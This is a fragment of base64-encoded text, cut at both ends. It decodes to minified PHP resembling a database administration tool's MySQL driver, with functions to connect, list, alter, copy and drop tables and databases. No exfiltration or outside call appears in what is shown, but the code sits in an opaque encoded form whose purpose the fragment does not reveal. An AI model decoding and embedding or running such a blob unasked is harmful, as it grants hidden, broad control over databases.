mZldGNoX2FycmF5KCk7cmV0dXJuJEtbJG9dO31mdW5jdGlvbg0KcXVvdGUoJFApe3JldHVybiInIi4kdGhpcy0+ZXNjYXBlX3N0cmluZygkUCkuIiciO319fWVsc2VpZihleHRlbnNpb25fbG9hZGVkKCJteXNxbCIpJiYhKGluaV9nZXQoInNxbC5zYWZlX21vZGUiKSYmZXh0ZW5zaW9uX2xvYWRlZCgicGRvX215c3FsIikpKXtjbGFzcw0KTWluX0RCe3ZhciRleHRlbnNpb249Ik15U1FMIiwkc2VydmVyX2luZm8sJGFmZmVjdGVkX3Jvd3MsJGVycm5vLCRlcnJvciwkX2xpbmssJF9yZXN1bHQ7ZnVuY3Rpb24NCmNvbm5lY3QoJE4sJFYsJEcpeyR0aGlzLT5fbGluaz1AbXlzcWxfY29ubmVjdCgoJE4hPSIiPyROOmluaV9nZXQoIm15c3FsLmRlZmF1bHRfaG9zdCIpKSwoIiROJFYiIT0iIj8kVjppbmlfZ2V0KCJteXNxbC5kZWZhdWx0X3VzZXIiKSksKCIkTiRWJEciIT0iIj8kRzppbmlfZ2V0KCJteXNxbC5kZWZhdWx0X3Bhc3N3b3JkIikpLHRydWUsMTMxMDcyKTtpZigkdGhpcy0+X2xpbmspJHRoaXMtPnNlcnZlcl9pbmZvPW15c3FsX2dldF9zZXJ2ZXJfaW5mbygkdGhpcy0+X2xpbmspO2Vsc2UkdGhpcy0+ZXJyb3I9bXlzcWxfZXJyb3IoKTtyZXR1cm4oYm9vbCkkdGhpcy0+X2xpbms7fWZ1bmN0aW9uDQpzZXRfY2hhcnNldCgkWmEpe2lmKGZ1bmN0aW9uX2V4aXN0cygnbXlzcWxfc2V0X2NoYXJzZXQnKSl7aWYobXlzcWxfc2V0X2NoYXJzZXQoJFphLCR0aGlzLT5fbGluaykpcmV0dXJuDQp0cnVlO215c3FsX3NldF9jaGFyc2V0KCd1dGY4JywkdGhpcy0+X2xpbmspO31yZXR1cm4kdGhpcy0+cXVlcnkoIlNFVCBOQU1FUyAkWmEiKTt9ZnVuY3Rpb24NCnF1b3RlKCRQKXtyZXR1cm4iJyIubXlzcWxfcmVhbF9lc2NhcGVfc3RyaW5nKCRQLCR0aGlzLT5fbGluaykuIiciO31mdW5jdGlvbg0Kc2VsZWN0X2RiKCRrKXtyZXR1cm4NCm15c3FsX3NlbGVjdF9kYigkaywkdGhpcy0+X2xpbmspO31mdW5jdGlvbg0KcXVlcnkoJEgsJF9oPWZhbHNlKXskST1AKCRfaD9teXNxbF91bmJ1ZmZlcmVkX3F1ZXJ5KCRILCR0aGlzLT5fbGluayk6bXlzcWxfcXVlcnkoJEgsJHRoaXMtPl9saW5rKSk7JHRoaXMtPmVycm9yPSIiO2lmKCEkSSl7JHRoaXMtPmVycm5vPW15c3FsX2Vycm5vKCR0aGlzLT5fbGluayk7JHRoaXMtPmVycm9yPW15c3FsX2Vycm9yKCR0aGlzLT5fbGluayk7cmV0dXJuDQpmYWxzZTt9aWYoJEk9PT10cnVlKXskdGhpcy0+YWZmZWN0ZWRfcm93cz1teXNxbF9hZmZlY3RlZF9yb3dzKCR0aGlzLT5fbGluayk7JHRoaXMtPmluZm89bXlzcWxfaW5mbygkdGhpcy0+X2xpbmspO3JldHVybg0KdHJ1ZTt9cmV0dXJuDQpuZXcNCk1pbl9SZXN1bHQoJEkpO31mdW5jdGlvbg0KbXVsdGlfcXVlcnkoJEgpe3JldHVybiR0aGlzLT5fcmVzdWx0PSR0aGlzLT5xdWVyeSgkSCk7fWZ1bmN0aW9uDQpzdG9yZV9yZXN1bHQoKXtyZXR1cm4kdGhpcy0+X3Jlc3VsdDt9ZnVuY3Rpb24NCm5leHRfcmVzdWx0KCl7cmV0dXJuDQpmYWxzZTt9ZnVuY3Rpb24NCnJlc3VsdCgkSCwkbz0wKXskST0kdGhpcy0+cXVlcnkoJEgpO2lmKCEkSXx8ISRJLT5udW1fcm93cylyZXR1cm4NCmZhbHNlO3JldHVybg0KbXlzcWxfcmVzdWx0KCRJLT5fcmVzdWx0LDAsJG8pO319Y2xhc3MNCk1pbl9SZXN1bHR7dmFyJG51bV9yb3dzLCRfcmVzdWx0LCRfb2Zmc2V0PTA7ZnVuY3Rpb24NCl9fY29uc3RydWN0KCRJKXskdGhpcy0+X3Jlc3VsdD0kSTskdGhpcy0+bnVtX3Jvd3M9bXlzcWxfbnVtX3Jvd3MoJEkpO31mdW5jdGlvbg0KZmV0Y2hfYXNzb2MoKXtyZXR1cm4NCm15c3FsX2ZldGNoX2Fzc29jKCR0aGlzLT5fcmVzdWx0KTt9ZnVuY3Rpb24NCmZldGNoX3Jvdygpe3JldHVybg0KbXlzcWxfZmV0Y2hfcm93KCR0aGlzLT5fcmVzdWx0KTt9ZnVuY3Rpb24NCmZldGNoX2ZpZWxkKCl7JEo9bXlzcWxfZmV0Y2hfZmllbGQoJHRoaXMtPl9yZXN1bHQsJHRoaXMtPl9vZmZzZXQrKyk7JEotPm9yZ3RhYmxlPSRKLT50YWJsZTskSi0+b3JnbmFtZT0kSi0+bmFtZTskSi0+Y2hhcnNldG5yPSgkSi0+YmxvYj82MzowKTtyZXR1cm4kSjt9ZnVuY3Rpb24NCl9fZGVzdHJ1Y3QoKXtteXNxbF9mcmVlX3Jlc3VsdCgkdGhpcy0+X3Jlc3VsdCk7fX19ZWxzZWlmKGV4dGVuc2lvbl9sb2FkZWQoInBkb19teXNxbCIpKXtjbGFzcw0KTWluX0RCDQpleHRlbmRzDQpNaW5fUERPe3ZhciRleHRlbnNpb249IlBET19NeVNRTCI7ZnVuY3Rpb24NCmNvbm5lY3QoJE4sJFYsJEcpeyR0aGlzLT5kc24oIm15c3FsOmNoYXJzZXQ9dXRmODtob3N0PSIuc3RyX3JlcGxhY2UoIjoiLCI7dW5peF9zb2NrZXQ9IixwcmVnX3JlcGxhY2UoJ346KFxcZCl+JywnO3BvcnQ9XFwxJywkTikpLCRWLCRHKTtyZXR1cm4NCnRydWU7fWZ1bmN0aW9uDQpzZXRfY2hhcnNldCgkWmEpeyR0aGlzLT5xdWVyeSgiU0VUIE5BTUVTICRaYSIpO31mdW5jdGlvbg0Kc2VsZWN0X2RiKCRrKXtyZXR1cm4kdGhpcy0+cXVlcnkoIlVTRSAiLmlkZl9lc2NhcGUoJGspKTt9ZnVuY3Rpb24NCnF1ZXJ5KCRILCRfaD1mYWxzZSl7JHRoaXMtPnNldEF0dHJpYnV0ZSgxMDAwLCEkX2gpO3JldHVybg0KcGFyZW50OjpxdWVyeSgkSCwkX2gpO319fWNsYXNzDQpNaW5fRHJpdmVyDQpleHRlbmRzDQpNaW5fU1FMe2Z1bmN0aW9uDQppbnNlcnQoJFEsJE8pe3JldHVybigkTz9wYXJlbnQ6Omluc2VydCgkUSwkTyk6cXVlcmllcygiSU5TRVJUIElOVE8gIi50YWJsZSgkUSkuIiAoKVxuVkFMVUVTICgpIikpO31mdW5jdGlvbg0KaW5zZXJ0VXBkYXRlKCRRLCRMLCR6Zil7JGY9YXJyYXlfa2V5cyhyZXNldCgkTCkpOyR4Zj0iSU5TRVJUIElOVE8gIi50YWJsZSgkUSkuIiAoIi5pbXBsb2RlKCIsICIsJGYpLiIpIFZBTFVFU1xuIjskUWg9YXJyYXkoKTtmb3JlYWNoKCRmDQphcyR4KSRRaFskeF09IiR4ID0gVkFMVUVTKCR4KSI7JExnPSJcbk9OIERVUExJQ0FURSBLRVkgVVBEQVRFICIuaW1wbG9kZSgiLCAiLCRRaCk7JFFoPWFycmF5KCk7JHk9MDtmb3JlYWNoKCRMDQphcyRPKXskWT0iKCIuaW1wbG9kZSgiLCAiLCRPKS4iKSI7aWYoJFFoJiYoc3RybGVuKCR4ZikrJHkrc3RybGVuKCRZKStzdHJsZW4oJExnKT4xZTYpKXtpZighcXVlcmllcygkeGYuaW1wbG9kZSgiLFxuIiwkUWgpLiRMZykpcmV0dXJuDQpmYWxzZTskUWg9YXJyYXkoKTskeT0wO30kUWhbXT0kWTskeSs9c3RybGVuKCRZKSsyO31yZXR1cm4NCnF1ZXJpZXMoJHhmLmltcGxvZGUoIixcbiIsJFFoKS4kTGcpO319ZnVuY3Rpb24NCmlkZl9lc2NhcGUoJHQpe3JldHVybiJgIi5zdHJfcmVwbGFjZSgiYCIsImBgIiwkdCkuImAiO31mdW5jdGlvbg0KdGFibGUoJHQpe3JldHVybg0KaWRmX2VzY2FwZSgkdCk7fWZ1bmN0aW9uDQpjb25uZWN0KCl7Z2xvYmFsJGI7JGc9bmV3DQpNaW5fREI7JGo9JGItPmNyZWRlbnRpYWxzKCk7aWYoJGctPmNvbm5lY3QoJGpbMF0sJGpbMV0sJGpbMl0pKXskZy0+c2V0X2NoYXJzZXQoY2hhcnNldCgkZykpOyRnLT5xdWVyeSgiU0VUIHNxbF9xdW90ZV9zaG93X2NyZWF0ZSA9IDEsIGF1dG9jb21taXQgPSAxIik7cmV0dXJuJGc7fSRKPSRnLT5lcnJvcjtpZihmdW5jdGlvbl9leGlzdHMoJ2ljb252JykmJiFpc191dGY4KCRKKSYmc3RybGVuKCRpZz1pY29udigid2luZG93cy0xMjUwIiwidXRmLTgiLCRKKSk+c3RybGVuKCRKKSkkSj0kaWc7cmV0dXJuJEo7fWZ1bmN0aW9uDQpnZXRfZGF0YWJhc2VzKCRKYyl7Z2xvYmFsJGc7JEo9Z2V0X3Nlc3Npb24oImRicyIpO2lmKCRKPT09bnVsbCl7JEg9KCRnLT5zZXJ2ZXJfaW5mbz49NT8iU0VMRUNUIFNDSEVNQV9OQU1FIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLlNDSEVNQVRBIjoiU0hPVyBEQVRBQkFTRVMiKTskSj0oJEpjP3Nsb3dfcXVlcnkoJEgpOmdldF92YWxzKCRIKSk7cmVzdGFydF9zZXNzaW9uKCk7c2V0X3Nlc3Npb24oImRicyIsJEopO3N0b3Bfc2Vzc2lvbigpO31yZXR1cm4kSjt9ZnVuY3Rpb24NCmxpbWl0KCRILCRaLCR6LCREPTAsJHJnPSIgIil7cmV0dXJuIiAkSCRaIi4oJHohPT1udWxsPyRyZy4iTElNSVQgJHoiLigkRD8iIE9GRlNFVCAkRCI6IiIpOiIiKTt9ZnVuY3Rpb24NCmxpbWl0MSgkSCwkWil7cmV0dXJuDQpsaW1pdCgkSCwkWiwxKTt9ZnVuY3Rpb24NCmRiX2NvbGxhdGlvbigkbSwkbWIpe2dsb2JhbCRnOyRKPW51bGw7JGk9JGctPnJlc3VsdCgiU0hPVyBDUkVBVEUgREFUQUJBU0UgIi5pZGZfZXNjYXBlKCRtKSwxKTtpZihwcmVnX21hdGNoKCd+IENPTExBVEUgKFteIF0rKX4nLCRpLCRCKSkkSj0kQlsxXTtlbHNlaWYocHJlZ19tYXRjaCgnfiBDSEFSQUNURVIgU0VUIChbXiBdKyl+JywkaSwkQikpJEo9JG1iWyRCWzFdXVstMV07cmV0dXJuJEo7fWZ1bmN0aW9uDQplbmdpbmVzKCl7JEo9YXJyYXkoKTtmb3JlYWNoKGdldF9yb3dzKCJTSE9XIEVOR0lORVMiKWFzJEspe2lmKHByZWdfbWF0Y2goIn5ZRVN8REVGQVVMVH4iLCRLWyJTdXBwb3J0Il0pKSRKW109JEtbIkVuZ2luZSJdO31yZXR1cm4kSjt9ZnVuY3Rpb24NCmxvZ2dlZF91c2VyKCl7Z2xvYmFsJGc7cmV0dXJuJGctPnJlc3VsdCgiU0VMRUNUIFVTRVIoKSIpO31mdW5jdGlvbg0KdGFibGVzX2xpc3QoKXtnbG9iYWwkZztyZXR1cm4NCmdldF9rZXlfdmFscygkZy0+c2VydmVyX2luZm8+PTU/IlNFTEVDVCBUQUJMRV9OQU1FLCBUQUJMRV9UWVBFIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLlRBQkxFUyBXSEVSRSBUQUJMRV9TQ0hFTUEgPSBEQVRBQkFTRSgpIE9SREVSIEJZIFRBQkxFX05BTUUiOiJTSE9XIFRBQkxFUyIpO31mdW5jdGlvbg0KY291bnRfdGFibGVzKCRsKXskSj1hcnJheSgpO2ZvcmVhY2goJGwNCmFzJG0pJEpbJG1dPWNvdW50KGdldF92YWxzKCJTSE9XIFRBQkxFUyBJTiAiLmlkZl9lc2NhcGUoJG0pKSk7cmV0dXJuJEo7fWZ1bmN0aW9uDQp0YWJsZV9zdGF0dXMoJEM9IiIsJENjPWZhbHNlKXtnbG9iYWwkZzskSj1hcnJheSgpO2ZvcmVhY2goZ2V0X3Jvd3MoJENjJiYkZy0+c2VydmVyX2luZm8+PTU/IlNFTEVDVCBUQUJMRV9OQU1FIEFTIE5hbWUsIEVuZ2luZSwgVEFCTEVfQ09NTUVOVCBBUyBDb21tZW50IEZST00gaW5mb3JtYXRpb25fc2NoZW1hLlRBQkxFUyBXSEVSRSBUQUJMRV9TQ0hFTUEgPSBEQVRBQkFTRSgpICIuKCRDIT0iIj8iQU5EIFRBQkxFX05BTUUgPSAiLnEoJEMpOiJPUkRFUiBCWSBOYW1lIik6IlNIT1cgVEFCTEUgU1RBVFVTIi4oJEMhPSIiPyIgTElLRSAiLnEoYWRkY3NsYXNoZXMoJEMsIiVfXFwiKSk6IiIpKWFzJEspe2lmKCRLWyJFbmdpbmUiXT09Iklubm9EQiIpJEtbIkNvbW1lbnQiXT1wcmVnX3JlcGxhY2UoJ34oPzooLispOyApP0lubm9EQiBmcmVlOiAuKn4nLCdcXDEnLCRLWyJDb21tZW50Il0pO2lmKCFpc3NldCgkS1siRW5naW5lIl0pKSRLWyJDb21tZW50Il09IiI7aWYoJEMhPSIiKXJldHVybiRLOyRKWyRLWyJOYW1lIl1dPSRLO31yZXR1cm4kSjt9ZnVuY3Rpb24NCmlzX3ZpZXcoJFIpe3JldHVybiRSWyJFbmdpbmUiXT09PW51bGw7fWZ1bmN0aW9uDQpma19zdXBwb3J0KCRSKXtnbG9iYWwkZztyZXR1cm4NCnByZWdfbWF0Y2goJ35Jbm5vREJ8SUJNREIySX5pJywkUlsiRW5naW5lIl0pfHwocHJlZ19tYXRjaCgnfk5EQn5pJywkUlsiRW5naW5lIl0pJiZ2ZXJzaW9uX2NvbXBhcmUoJGctPnNlcnZlcl9pbmZvLCc1LjYnKT49MCk7fWZ1bmN0aW9uDQpmaWVsZHMoJFEpeyRKPWFycmF5KCk7Zm9yZWFjaChnZXRfcm93cygiU0hPVyBGVUxMIENPTFVNTlMgRlJPTSAiLnRhYmxlKCRRKSlhcyRLKXtwcmVnX21hdGNoKCd+XihbXiggXSspKD86XFwoKC4rKVxcKSk/KCB1bnNpZ25lZCk/KCB6ZXJvZmlsbCk/JH4nLCRLWyJUeXBlIl0sJEIpOyRKWyRLWyJGaWVsZCJdXT1hcnJheSgiZmllbGQiPT4kS1siRmllbGQiXSwiZnVsbF90eXBlIj0+JEtbIlR5cGUiXSwidHlwZSI9PiRCWzFdLCJsZW5ndGgiPT4kQlsyXSwidW5zaWduZWQiPT5sdHJpbSgkQlszXS4kQls0XSksImRlZmF1bHQiPT4oJEtbIkRlZmF1bHQiXSE9IiJ8fHByZWdfbWF0Y2goIn5jaGFyfHNldH4iLCRCWzFdKT8kS1siRGVmYXVsdCJdOm51bGwpLCJudWxsIj0+KCRLWyJOdWxsIl09PSJZRVMiKSwiYXV0b19pbmNyZW1lbnQiPT4oJEtbIkV4dHJhIl09PSJhdXRvX2luY3JlbWVudCIpLCJvbl91cGRhdGUiPT4ocHJlZ19tYXRjaCgnfl5vbiB1cGRhdGUgKC4rKX5pJywkS1siRXh0cmEiXSwkQik/JEJbMV06IiIpLCJjb2xsYXRpb24iPT4kS1siQ29sbGF0aW9uIl0sInByaXZpbGVnZXMiPT5hcnJheV9mbGlwKHByZWdfc3BsaXQoJ34sICp+JywkS1siUHJpdmlsZWdlcyJdKSksImNvbW1lbnQiPT4kS1siQ29tbWVudCJdLCJwcmltYXJ5Ij0+KCRLWyJLZXkiXT09IlBSSSIpLCk7fXJldHVybiRKO31mdW5jdGlvbg0KaW5kZXhlcygkUSwkaD1udWxsKXskSj1hcnJheSgpO2ZvcmVhY2goZ2V0X3Jvd3MoIlNIT1cgSU5ERVggRlJPTSAiLnRhYmxlKCRRKSwkaClhcyRLKXskSlskS1siS2V5X25hbWUiXV1bInR5cGUiXT0oJEtbIktleV9uYW1lIl09PSJQUklNQVJZIj8iUFJJTUFSWSI6KCRLWyJJbmRleF90eXBlIl09PSJGVUxMVEVYVCI/IkZVTExURVhUIjooJEtbIk5vbl91bmlxdWUiXT8iSU5ERVgiOiJVTklRVUUiKSkpOyRKWyRLWyJLZXlfbmFtZSJdXVsiY29sdW1ucyJdW109JEtbIkNvbHVtbl9uYW1lIl07JEpbJEtbIktleV9uYW1lIl1dWyJsZW5ndGhzIl1bXT0kS1siU3ViX3BhcnQiXTskSlskS1siS2V5X25hbWUiXV1bImRlc2NzIl1bXT1udWxsO31yZXR1cm4kSjt9ZnVuY3Rpb24NCmZvcmVpZ25fa2V5cygkUSl7Z2xvYmFsJGcsJEplO3N0YXRpYyRwZj0nYCg/OlteYF18YGApK2AnOyRKPWFycmF5KCk7JEFiPSRnLT5yZXN1bHQoIlNIT1cgQ1JFQVRFIFRBQkxFICIudGFibGUoJFEpLDEpO2lmKCRBYil7cHJlZ19tYXRjaF9hbGwoIn5DT05TVFJBSU5UICgkcGYpIEZPUkVJR04gS0VZID9cXCgoKD86JHBmLD8gPykrKVxcKSBSRUZFUkVOQ0VTICgkcGYpKD86XFwuKCRwZikpPyBcXCgoKD86JHBmLD8gPykrKVxcKSg/OiBPTiBERUxFVEUgKCRKZSkpPyg/OiBPTiBVUERBVEUgKCRKZSkpP34iLCRBYiwkYWUsUFJFR19TRVRfT1JERVIpO2ZvcmVhY2goJGFlDQphcyRCKXtwcmVnX21hdGNoX2FsbCgifiRwZn4iLCRCWzJdLCRBZyk7cHJlZ19tYXRjaF9hbGwoIn4kcGZ+IiwkQls1XSwkWWcpOyRKW2lkZl91bmVzY2FwZSgkQlsxXSldPWFycmF5KCJkYiI9PmlkZl91bmVzY2FwZSgkQls0XSE9IiI/JEJbM106JEJbNF0pLCJ0YWJsZSI9PmlkZl91bmVzY2FwZSgkQls0XSE9IiI/JEJbNF06JEJbM10pLCJzb3VyY2UiPT5hcnJheV9tYXAoJ2lkZl91bmVzY2FwZScsJEFnWzBdKSwidGFyZ2V0Ij0+YXJyYXlfbWFwKCdpZGZfdW5lc2NhcGUnLCRZZ1swXSksIm9uX2RlbGV0ZSI9PigkQls2XT8kQls2XToiUkVTVFJJQ1QiKSwib25fdXBkYXRlIj0+KCRCWzddPyRCWzddOiJSRVNUUklDVCIpLCk7fX1yZXR1cm4kSjt9ZnVuY3Rpb24NCnZpZXcoJEMpe2dsb2JhbCRnO3JldHVybg0KYXJyYXkoInNlbGVjdCI9PnByZWdfcmVwbGFjZSgnfl4oPzpbXmBdfGBbXmBdKmApKlxccytBU1xccyt+aXNVJywnJywkZy0+cmVzdWx0KCJTSE9XIENSRUFURSBWSUVXICIudGFibGUoJEMpLDEpKSk7fWZ1bmN0aW9uDQpjb2xsYXRpb25zKCl7JEo9YXJyYXkoKTtmb3JlYWNoKGdldF9yb3dzKCJTSE9XIENPTExBVElPTiIpYXMkSyl7aWYoJEtbIkRlZmF1bHQiXSkkSlskS1siQ2hhcnNldCJdXVstMV09JEtbIkNvbGxhdGlvbiJdO2Vsc2UkSlskS1siQ2hhcnNldCJdXVtdPSRLWyJDb2xsYXRpb24iXTt9a3NvcnQoJEopO2ZvcmVhY2goJEoNCmFzJHg9PiRYKWFzb3J0KCRKWyR4XSk7cmV0dXJuJEo7fWZ1bmN0aW9uDQppbmZvcm1hdGlvbl9zY2hlbWEoJG0pe2dsb2JhbCRnO3JldHVybigkZy0+c2VydmVyX2luZm8+PTUmJiRtPT0iaW5mb3JtYXRpb25fc2NoZW1hIil8fCgkZy0+c2VydmVyX2luZm8+PTUuNSYmJG09PSJwZXJmb3JtYW5jZV9zY2hlbWEiKTt9ZnVuY3Rpb24NCmVycm9yKCl7Z2xvYmFsJGc7cmV0dXJuDQpoKHByZWdfcmVwbGFjZSgnfl5Zb3UgaGF2ZSBhbiBlcnJvci4qc3ludGF4IHRvIHVzZX5VJywiU3ludGF4IGVycm9yIiwkZy0+ZXJyb3IpKTt9ZnVuY3Rpb24NCmNyZWF0ZV9kYXRhYmFzZSgkbSwkZCl7cmV0dXJuDQpxdWVyaWVzKCJDUkVBVEUgREFUQUJBU0UgIi5pZGZfZXNjYXBlKCRtKS4oJGQ/IiBDT0xMQVRFICIucSgkZCk6IiIpKTt9ZnVuY3Rpb24NCmRyb3BfZGF0YWJhc2VzKCRsKXskSj1hcHBseV9xdWVyaWVzKCJEUk9QIERBVEFCQVNFIiwkbCwnaWRmX2VzY2FwZScpO3Jlc3RhcnRfc2Vzc2lvbigpO3NldF9zZXNzaW9uKCJkYnMiLG51bGwpO3JldHVybiRKO31mdW5jdGlvbg0KcmVuYW1lX2RhdGFiYXNlKCRDLCRkKXskSj1mYWxzZTtpZihjcmVhdGVfZGF0YWJhc2UoJEMsJGQpKXskV2Y9YXJyYXkoKTtmb3JlYWNoKHRhYmxlc19saXN0KClhcyRRPT4kVSkkV2ZbXT10YWJsZSgkUSkuIiBUTyAiLmlkZl9lc2NhcGUoJEMpLiIuIi50YWJsZSgkUSk7JEo9KCEkV2Z8fHF1ZXJpZXMoIlJFTkFNRSBUQUJMRSAiLmltcGxvZGUoIiwgIiwkV2YpKSk7aWYoJEopcXVlcmllcygiRFJPUCBEQVRBQkFTRSAiLmlkZl9lc2NhcGUoREIpKTtyZXN0YXJ0X3Nlc3Npb24oKTtzZXRfc2Vzc2lvbigiZGJzIixudWxsKTt9cmV0dXJuJEo7fWZ1bmN0aW9uDQphdXRvX2luY3JlbWVudCgpeyRMYT0iIFBSSU1BUlkgS0VZIjtpZigkX0dFVFsiY3JlYXRlIl0hPSIiJiYkX1BPU1RbImF1dG9faW5jcmVtZW50X2NvbCJdKXtmb3JlYWNoKGluZGV4ZXMoJF9HRVRbImNyZWF0ZSJdKWFzJHUpe2lmKGluX2FycmF5KCRfUE9TVFsiZmllbGRzIl1bJF9QT1NUWyJhdXRvX2luY3JlbWVudF9jb2wiXV1bIm9yaWciXSwkdVsiY29sdW1ucyJdLHRydWUpKXskTGE9IiI7YnJlYWs7fWlmKCR1WyJ0eXBlIl09PSJQUklNQVJZIikkTGE9IiBVTklRVUUiO319cmV0dXJuIiBBVVRPX0lOQ1JFTUVOVCRMYSI7fWZ1bmN0aW9uDQphbHRlcl90YWJsZSgkUSwkQywkcCwkS2MsJHFiLCRsYywkZCwkS2EsJGtmKXskYz1hcnJheSgpO2ZvcmVhY2goJHANCmFzJG8pJGNbXT0oJG9bMV0/KCRRIT0iIj8oJG9bMF0hPSIiPyJDSEFOR0UgIi5pZGZfZXNjYXBlKCRvWzBdKToiQUREIik6IiAiKS4iICIuaW1wbG9kZSgkb1sxXSkuKCRRIT0iIj8kb1syXToiIik6IkRST1AgIi5pZGZfZXNjYXBlKCRvWzBdKSk7JGM9YXJyYXlfbWVyZ2UoJGMsJEtjKTskRmc9KCRxYiE9PW51bGw/IiBDT01NRU5UPSIucSgkcWIpOiIiKS4oJGxjPyIgRU5HSU5FPSIucSgkbGMpOiIiKS4oJGQ/IiBDT0xMQVRFICIucSgkZCk6IiIpLigkS2EhPSIiPyIgQVVUT19JTkNSRU1FTlQ9JEthIjoiIik7aWYoJFE9PSIiKXJldHVybg0KcXVlcmllcygiQ1JFQVRFIFRBQkxFICIudGFibGUoJEMpLiIgKFxuIi5pbXBsb2RlKCIsXG4iLCRjKS4iXG4pJEZnJGtmIik7aWYoJFEhPSRDKSRjW109IlJFTkFNRSBUTyAiLnRhYmxlKCRDKTtpZigkRmcpJGNbXT1sdHJpbSgkRmcpO3JldHVybigkY3x8JGtmP3F1ZXJpZXMoIkFMVEVSIFRBQkxFICIudGFibGUoJFEpLiJcbiIuaW1wbG9kZSgiLFxuIiwkYykuJGtmKTp0cnVlKTt9ZnVuY3Rpb24NCmFsdGVyX2luZGV4ZXMoJFEsJGMpe2ZvcmVhY2goJGMNCmFzJHg9PiRYKSRjWyR4XT0oJFhbMl09PSJEUk9QIj8iXG5EUk9QIElOREVYICIuaWRmX2VzY2FwZSgkWFsxXSk6IlxuQUREICRYWzBdICIuKCRYWzBdPT0iUFJJTUFSWSI/IktFWSAiOiIiKS4oJFhbMV0hPSIiP2lkZl9lc2NhcGUoJFhbMV0pLiIgIjoiIikuIigiLmltcGxvZGUoIiwgIiwkWFsyXSkuIikiKTtyZXR1cm4NCnF1ZXJpZXMoIkFMVEVSIFRBQkxFICIudGFibGUoJFEpLmltcGxvZGUoIiwiLCRjKSk7fWZ1bmN0aW9uDQp0cnVuY2F0ZV90YWJsZXMoJFMpe3JldHVybg0KYXBwbHlfcXVlcmllcygiVFJVTkNBVEUgVEFCTEUiLCRTKTt9ZnVuY3Rpb24NCmRyb3Bfdmlld3MoJFZoKXtyZXR1cm4NCnF1ZXJpZXMoIkRST1AgVklFVyAiLmltcGxvZGUoIiwgIixhcnJheV9tYXAoJ3RhYmxlJywkVmgpKSk7fWZ1bmN0aW9uDQpkcm9wX3RhYmxlcygkUyl7cmV0dXJuDQpxdWVyaWVzKCJEUk9QIFRBQkxFICIuaW1wbG9kZSgiLCAiLGFycmF5X21hcCgndGFibGUnLCRTKSkpO31mdW5jdGlvbg0KbW92ZV90YWJsZXMoJFMsJFZoLCRZZyl7JFdmPWFycmF5KCk7Zm9yZWFjaChhcnJheV9tZXJnZSgkUywkVmgpYXMkUSkkV2ZbXT10YWJsZSgkUSkuIiBUTyAiLmlkZl9lc2NhcGUoJFlnKS4iLiIudGFibGUoJFEpO3JldHVybg0KcXVlcmllcygiUkVOQU1FIFRBQkxFICIuaW1wbG9kZSgiLCAiLCRXZikpO31mdW5jdGlvbg0KY29weV90YWJsZXMoJFMsJFZoLCRZZyl7cXVlcmllcygiU0VUIHNxbF9tb2RlID0gJ05PX0FVVE9fVkFMVUVfT05fWkVSTyciKTtmb3JlYWNoKCRTDQphcyRRKXskQz0oJFlnPT1EQj90YWJsZSgiY29weV8kUSIpOmlkZl9lc2NhcGUoJFlnKS4iLiIudGFibGUoJFEpKTtpZighcXVlcmllcygiXG5EUk9QIFRBQkxFIElGIEVYSVNUUyAkQyIpfHwhcXVlcmllcygiQ1JFQVRFIFRBQkxFICRDIExJS0UgIi50YWJsZSgkUSkpfHwhcXVlcmllcygiSU5TRVJUIElOVE8gJEMgU0VMRUNUICogRlJPTSAiLnRhYmxlKCRRKSkpcmV0dXJuDQpmYWxzZTt9Zm9yZWFjaCgkVmgNCmFzJFEpeyRDPSgkWWc9PURCP3RhYmxlKCJjb3B5XyRRIik6aWRmX2VzY2FwZSgkWWcpLiIuIi50YWJsZSgkUSkpOyRVaD12aWV3KCRRKTtpZighcXVlcmllcygiRFJPUCBWSUVXIElGIEVYSVNUUyAkQyIpfHwhcXVlcmllcygiQ1JFQVRFIFZJRVcgJEMgQVMgJFVoW3NlbGVjdF0iKSlyZXR1cm4NCmZhbHNlO31yZXR1cm4NCnRydWU7fWZ1bmN0aW9uDQp0cmlnZ2VyKCRDKXtpZigkQz09IiIpcmV0dXJuDQphcnJheSgpOyRMPWdldF9yb3dzKCJTSE9XIFRSSUdHRVJTIFdIRVJFIGBUcmlnZ2VyYCA9ICIucSgkQykpO3JldHVybg0KcmVzZXQoJEwpO31mdW5jdGlvbg0KdHJpZ2dlcnMoJFEpeyRKPWFycmF5KCk7Zm9yZWFjaChnZXRfcm93cygiU0hPVyBUUklHR0VSUyBMSUtFICIucShhZGRjc2xhc2hlcygkUSwiJV9cXCIpKSlhcyRLKSRKWyRLWyJUcmlnZ2VyIl1dPWFycmF5KCRLWyJUaW1pbmciXSwkS1siRXZlbnQiXSk7cmV0dXJuJEo7fWZ1bmN0aW9uDQp0cmlnZ2VyX29wdGlvbnMoKXtyZXR1cm4NCmFycmF5KCJUaW1pbmciPT5hcnJheSgiQkVGT1JFIiwiQUZURVIiKSwiRXZlbnQiPT5hcnJheSgiSU5TRVJUIiwiVVBEQVRFIiwiREVMRVRFIiksIlR5cGUiPT5hcnJheSgiRk9SIEVBQ0ggUk9XIiksKTt9ZnVuY3Rpb24NCnJvdXRpbmUoJEMsJFUpe2dsb2JhbCRnLCRuYywkc2QsJHpoOyRCYT1hcnJheSgiYm9vbCIsImJvb2xlYW4iLCJpbnRlZ2VyIiwiZG91YmxlIHByZWNpc2lvbiIsInJlYWwiLCJkZWMiLCJudW1lcmljIiwiZml4ZWQiLCJuYXRpb25hbCBjaGFyIiwibmF0aW9uYWwgdmFyY2hhciIpOyR5aD0iKCgiLmltcGxvZGUoInwiLGFycmF5X21lcmdlKGFycmF5X2tleXMoJHpoKSwkQmEpKS4iKVxcYig/OlxccypcXCgoKD86W14nXCIpXXwkbmMpKyspXFwpKT9cXHMqKHplcm9maWxsXFxzKik/KHVuc2lnbmVkKD86XFxzK3plcm9maWxsKT8pPykoPzpcXHMqKD86Q0hBUlNFVHxDSEFSQUNURVJcXHMrU0VUKVxccypbJ1wiXT8oW14nXCJcXHMsXSspWydcIl0/KT8iOyRwZj0iXFxzKigiLigkVT09IkZVTkNUSU9OIj8iIjokc2QpLiIpP1xccyooPzpgKCg/OlteYF18YGApKilgXFxzKnxcXGIoXFxTKylcXHMrKSR5aCI7JGk9JGctPnJlc3VsdCgiU0hPVyBDUkVBVEUgJFUgIi5pZGZfZXNjYXBlKCRDKSwyKTtwcmVnX21hdGNoKCJ+XFwoKCg/OiRwZlxccyosPykqKVxcKVxccyoiLigkVT09IkZVTkNUSU9OIj8iUkVUVVJOU1xccyskeWhcXHMrIjoiIikuIiguKil+aXMiLCR